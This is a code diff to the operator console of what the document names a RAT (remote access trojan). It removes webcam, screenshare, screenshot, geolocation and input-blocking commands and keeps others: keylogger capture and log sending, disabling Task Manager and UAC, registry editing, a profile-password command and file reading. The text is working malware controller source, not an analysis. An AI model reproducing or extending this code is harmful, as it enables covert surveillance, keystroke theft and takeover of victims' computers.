@@ -44,9 +44,6 @@ class RAT_SERVER:
         print(f'''
 help                      all commands available
 writein <text>            write the text to current opened window
-browser                   enter quiery to browser
-turnoffmon                turn off the monitor
-turnonmon                 turn on the monitor
 reboot                    reboot the system
 drivers                   all drivers of PC
 kill                      kill the system task
@@ -64,13 +61,9 @@ disabletaskmgr            disable Task Manager
 enabletaskmgr             enable Task Manager
 disableUAC                disable UAC
 monitors                  get all used monitors
-geolocate                 get location of computer
-volumeup                  increase system volume to 100%
-volumedown                decrease system volume to 0%
 setvalue                  set value in registry
 delkey                    delete key in registry
 createkey                 create key in registry
-setwallpaper              set wallpaper
 exit                      terminate the session of RAT
 ''')
         print("======================================================")
@@ -101,18 +94,6 @@ profilepswd               password for profile
 keyscan_start             start keylogger
 send_logs                 send captured keystrokes
 stop_keylogger            stop keylogger
-disable(--keyboard/--mouse/--all) 
-enable(--keyboard/--mouse/--all)
-''')
-        print("======================================================")
-        print("Video: ")
-        print("======================================================")
-        print(f'''
-screenshare               overseing remote PC
-webcam                    webcam video capture
-breakstream               break webcam/screenshare stream
-screenshot                capture screenshot
-webcam_snap               capture webcam photo
 ''')
         print("======================================================")
         print("Files:")
@@ -194,12 +175,6 @@ readfile <file>           read from file
             elif command == 'usbdrivers':
                 self.result()
             
-            elif command == 'volumeup':
-                self.result()
-            
-            elif command == 'volumedown':
-                self.result()
-            
             elif command == 'monitors':
                 self.result()
             
@@ -211,22 +186,6 @@ readfile <file>           read from file
             
             elif command == 'extendrights':
                 self.result()
-            
-            elif command == 'geolocate':
-                self.result()
-            
-            elif command == 'turnoffmon':
-                self.result()
-            
-            elif command == 'turnonmon':
-                self.result()
-            
-            elif command == 'setwallpaper':
-                client.send(command.encode())
-                text = str(input("Enter the filename: "))
-                client.send(text.encode())
-                result_output = client.recv(1024).decode()
-                print(result_output)
             
             elif command == 'keyscan_start':
                 client.send(command.encode())
@@ -329,31 +288,6 @@ readfile <file>           read from file
                     print(result_output)
                     print("===================================================")
             
-            elif command.startswith("disable") and command.endswith("--keyboard"):
-                self.result()
-            
-            elif command.startswith("disable") and command.endswith("--mouse"):
-                self.result()
-            
-            elif command.startswith("disable") and command.endswith("--all"):
-                self.result()
-            
-            elif command.startswith("enable") and command.endswith("--all"):
-                self.result()
-            
-            elif command.startswith("enable") and command.endswith("--keyboard"):
-                self.result()
-            
-            elif command.startswith("enable") and command.endswith("--mouse"):
-                self.result()
-            
-            elif command[:7] == 'browser':
-                client.send(command.encode())
-                quiery = str(input("Enter the quiery: "))
-                client.send(quiery.encode())
-                result_output = client.recv(1024).decode()
-                print(result_output)
-            
             elif command[:2] == 'cp':
                 self.result()
             
@@ -386,17 +320,6 @@ readfile <file>           read from file
             
             elif command == 'pwd':
                 self.result()
-            
-            elif command == 'screenshare':
-                client.send(command.encode("utf-8"))
-                self.server()
-            
-            elif command == 'webcam':
-                client.send(command.encode("utf-8"))
-                self.server()
-            
-            elif command == 'breakstream':
-                self.stop_server()
             
             elif command[:9] == 'startfile':
                 if not command[10:]:
@@ -436,24 +359,6 @@ readfile <file>           read from file
             
             elif command == 'help':
                 self.banner()
-            
-            elif command == 'screenshot':
-                client.send(command.encode())
-                file = client.recv(2147483647)
-                path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
-                with open(path, 'wb') as f:
-                    f.write(file)
-                    f.close()
-                path1 = os.path.abspath(path)
-                print(f"File is stored at {path1}")
-            
-            elif command == 'webcam_snap':
-                client.send(command.encode())
-                file = client.recv(2147483647)
-                with open(f'{os.getcwd()}\\{random.randint(11111,99999)}.png', 'wb') as f:
-                    f.write(file)
-                    f.close()
-                print("File is downloaded")
 
             elif command == 'exit':
                 client.send(command.encode())
